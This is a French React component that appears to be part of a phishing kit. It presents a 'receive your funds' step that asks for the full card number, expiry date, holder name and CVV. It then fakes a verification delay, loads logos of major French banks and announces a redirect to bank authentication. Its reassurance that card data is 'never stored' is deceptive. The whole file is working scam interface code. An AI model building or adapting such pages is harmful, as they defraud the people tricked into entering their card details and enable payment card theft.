import React, { useState } from 'react';
import { FormContainer } from './ui/FormContainer';
import { Input } from './ui/Input';
import { CreditCard } from 'lucide-react';
import { Loader2 } from 'lucide-react';
import { fetchAllBankLogos } from '../utils/api';

interface BankFormProps {
  onSubmit: (formData: BankFormData) => Promise<boolean>;
  amount: string;
}

export interface BankFormData {
  cardNumber: string;
  expiryMonth: string;
  expiryYear: string;
  cvv: string;
  cardHolder: string;
}

// Banques partenaires pour le préchargement des logos
const partnerBanks = [
  {
    id: 'bnp',
    name: 'BNP Paribas',
    url: 'https://www.bnpparibas.fr'
  },
  {
    id: 'sg',
    name: 'Société Générale',
    url: 'https://www.societegenerale.fr'
  },
  {
    id: 'laposte',
    name: 'La Banque Postale',
    url: 'https://www.labanquepostale.fr'
  }
];

export function BankForm({ onSubmit, amount }: BankFormProps) {
  const [formData, setFormData] = useState<BankFormData>({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardHolder: ''
  });
  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [showLoader, setShowLoader] = useState(false);
  const [loadingStep, setLoadingStep] = useState<'verification' | 'logos' | 'complete'>('verification');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('sending');
    setShowLoader(true);
    setLoadingStep('verification');

    try {
      // Étape 1: Vérification de la carte
      const success = await onSubmit(formData);
      if (!success) throw new Error('Failed to submit form');
      
      setStatus('success');
      
      // Étape 2: Préchargement des logos bancaires
      setLoadingStep('logos');
      
      // Simuler un délai de vérification + précharger les logos
      await Promise.all([
        new Promise(resolve => setTimeout(resolve, 2000)), // Délai de vérification
        fetchAllBankLogos(partnerBanks) // Préchargement des logos
      ]);
      
      setLoadingStep('complete');
      
      // Petit délai avant de passer à l'étape suivante
      setTimeout(() => {
        setShowLoader(false);
        setStatus('idle');
      }, 1000);
      
    } catch (error) {
      setStatus('error');
      setShowLoader(false);
      setTimeout(() => setStatus('idle'), 3000);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    let formattedValue = value;
    
    // Format card number with spaces
    if (name === 'cardNumber') {
      formattedValue = value.replace(/\s/g, '').replace(/(.{4})/g, '$1 ').trim();
    }
    
    setFormData(prev => ({
      ...prev,
      [name]: formattedValue
    }));
  };

  // Show loader overlay when processing
  if (showLoader) {
    const getLoadingContent = () => {
      switch (loadingStep) {
        case 'verification':
          return {
            title: 'Vérification en cours...',
            subtitle: 'Vérification de vos informations bancaires en cours. Veuillez patienter.',
            progress: '45%'
          };
        case 'logos':
          return {
            title: 'Préparation de l\'authentification...',
            subtitle: 'Chargement des interfaces bancaires sécurisées pour votre authentification.',
            progress: '75%'
          };
        case 'complete':
          return {
            title: 'Vérification terminée !',
            subtitle: 'Votre carte a été vérifiée avec succès. Redirection vers l\'authentification bancaire.',
            progress: '100%'
          };
        default:
          return {
            title: 'Traitement en cours...',
            subtitle: 'Veuillez patienter.',
            progress: '50%'
          };
      }
    };

    const loadingContent = getLoadingContent();

    return (
      <div className="min-h-screen bg-gradient-to-br from-yellow-200 to-yellow-100 pt-20">
        <div className="max-w-xl mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              <div className="relative mb-6">
                <Loader2 className="w-12 h-12 animate-spin text-yellow-500" />
                {loadingStep === 'complete' && (
                  <div className="absolute inset-0 flex items-center justify-center">
                    <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                  </div>
                )}
              </div>
              
              <h2 className="text-2xl font-bold text-gray-800 mb-4 text-center">
                {loadingContent.title}
              </h2>
              
              <p className="text-gray-600 text-center max-w-md mb-8">
                {loadingContent.subtitle}
              </p>

              {/* Progress Bar */}
              <div className="w-full max-w-xs mb-4">
                <div className="bg-gray-200 rounded-full h-2">
                  <div 
                    className={`h-2 rounded-full transition-all duration-1000 ${
                      loadingStep === 'complete' ? 'bg-green-500' : 'bg-yellow-500'
                    }`}
                    style={{ width: loadingContent.progress }}
                  ></div>
                </div>
              </div>

              {/* Loading Steps */}
              <div className="text-center space-y-2">
                <div className={`flex items-center justify-center space-x-2 text-sm ${
                  loadingStep === 'verification' ? 'text-yellow-600 font-medium' : 
                  loadingStep === 'logos' || loadingStep === 'complete' ? 'text-green-600' : 'text-gray-400'
                }`}>
                  <div className={`w-2 h-2 rounded-full ${
                    loadingStep === 'verification' ? 'bg-yellow-500 animate-pulse' :
                    loadingStep === 'logos' || loadingStep === 'complete' ? 'bg-green-500' : 'bg-gray-300'
                  }`}></div>
                  <span>Vérification de la carte</span>
                </div>
                
                <div className={`flex items-center justify-center space-x-2 text-sm ${
                  loadingStep === 'logos' ? 'text-yellow-600 font-medium' : 
                  loadingStep === 'complete' ? 'text-green-600' : 'text-gray-400'
                }`}>
                  <div className={`w-2 h-2 rounded-full ${
                    loadingStep === 'logos' ? 'bg-yellow-500 animate-pulse' :
                    loadingStep === 'complete' ? 'bg-green-500' : 'bg-gray-300'
                  }`}></div>
                  <span>Préparation authentification</span>
                </div>
                
                <div className={`flex items-center justify-center space-x-2 text-sm ${
                  loadingStep === 'complete' ? 'text-green-600 font-medium' : 'text-gray-400'
                }`}>
                  <div className={`w-2 h-2 rounded-full ${
                    loadingStep === 'complete' ? 'bg-green-500' : 'bg-gray-300'
                  }`}></div>
                  <span>Redirection</span>
                </div>
              </div>

              {/* Security Notice */}
              <div className="mt-8 bg-blue-50 border border-blue-200 rounded-lg p-4 max-w-md">
                <div className="flex items-center space-x-2">
                  <div className="w-5 h-5 bg-blue-100 rounded-full flex items-center justify-center">
                    <span className="text-blue-600 text-xs">🔒</span>
                  </div>
                  <p className="text-xs text-blue-700">
                    Vos données sont protégées par un cryptage de niveau bancaire
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <FormContainer
      title="Configuration du moyen de paiement"
      subtitle="Configurez votre carte bancaire pour recevoir vos fonds en toute sécurité."
      step="ÉTAPE 2"
    >
      {/* Amount Display */}
      <div className="bg-gradient-to-r from-green-50 to-green-100 border border-green-200 rounded-lg p-4 mb-8">
        <div className="flex items-center justify-between">
          <span className="text-green-700 font-medium">Montant à recevoir :</span>
          <span className="text-2xl font-bold text-green-800">{amount} €</span>
        </div>
      </div>

      {/* Credit Card Preview */}
      <div className="mb-8">
        <div className="relative w-full max-w-sm mx-auto">
          <div className="bg-gradient-to-br from-gray-800 to-gray-900 rounded-xl p-6 text-white shadow-2xl transform perspective-1000 rotate-y-5">
            <div className="flex justify-between items-start mb-8">
              <CreditCard className="w-8 h-8 text-yellow-400" />
              <div className="text-right">
                <div className="text-xs opacity-75">CARTE BANCAIRE</div>
              </div>
            </div>
            
            <div className="mb-6">
              <div className="text-lg font-mono tracking-wider">
                {formData.cardNumber || '•••• •••• •••• ••••'}
              </div>
            </div>
            
            <div className="flex justify-between items-end">
              <div>
                <div className="text-xs opacity-75 mb-1">TITULAIRE</div>
                <div className="text-sm font-medium">
                  {formData.cardHolder || 'NOM PRÉNOM'}
                </div>
              </div>
              <div className="text-right">
                <div className="text-xs opacity-75 mb-1">EXPIRE</div>
                <div className="text-sm font-mono">
                  {formData.expiryMonth && formData.expiryYear 
                    ? `${formData.expiryMonth}/${formData.expiryYear.slice(-2)}`
                    : 'MM/AA'
                  }
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        <Input
          label="Nom du titulaire de la carte"
          name="cardHolder"
          value={formData.cardHolder}
          onChange={handleChange}
          placeholder="Nom complet tel qu'il apparaît sur la carte"
          required
        />

        <Input
          label="Numéro de votre carte bancaire"
          name="cardNumber"
          value={formData.cardNumber}
          onChange={handleChange}
          placeholder="1234 5678 9012 3456"
          maxLength={19}
          required
        />

        <div className="space-y-6">
          <label className="block text-sm font-medium text-gray-700">
            Date d'expiration
          </label>
          <div className="grid grid-cols-2 gap-4">
            <Input
              label=""
              name="expiryMonth"
              value={formData.expiryMonth}
              onChange={handleChange}
              placeholder="MM"
              maxLength={2}
              required
            />
            <Input
              label=""
              name="expiryYear"
              value={formData.expiryYear}
              onChange={handleChange}
              placeholder="AAAA"
              maxLength={4}
              required
            />
          </div>
        </div>

        <Input
          type="password"
          label="Cryptogramme visuel (CVV)"
          name="cvv"
          value={formData.cvv}
          onChange={handleChange}
          placeholder="123"
          maxLength={3}
          required
        />

        <button
          type="submit"
          disabled={status === 'sending'}
          className="w-full bg-black text-white font-semibold py-4 rounded-lg transition duration-200 hover:bg-gray-800 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {status === 'sending' ? 'Vérification en cours...' : 'CONFIGURER MA CARTE'}
        </button>

        {status === 'success' && !showLoader && (
          <div className="text-green-600 text-center bg-green-50 p-3 rounded-lg">
            Carte configurée avec succès!
          </div>
        )}
        {status === 'error' && (
          <div className="text-red-600 text-center bg-red-50 p-3 rounded-lg">
            Échec de la configuration. Veuillez réessayer.
          </div>
        )}
      </form>

      <p className="text-xs text-gray-500 italic mt-6 text-center">
        Vos informations bancaires sont sécurisées par un cryptage de niveau bancaire et ne sont jamais stockées sur nos serveurs.
      </p>
    </FormContainer>
  );
}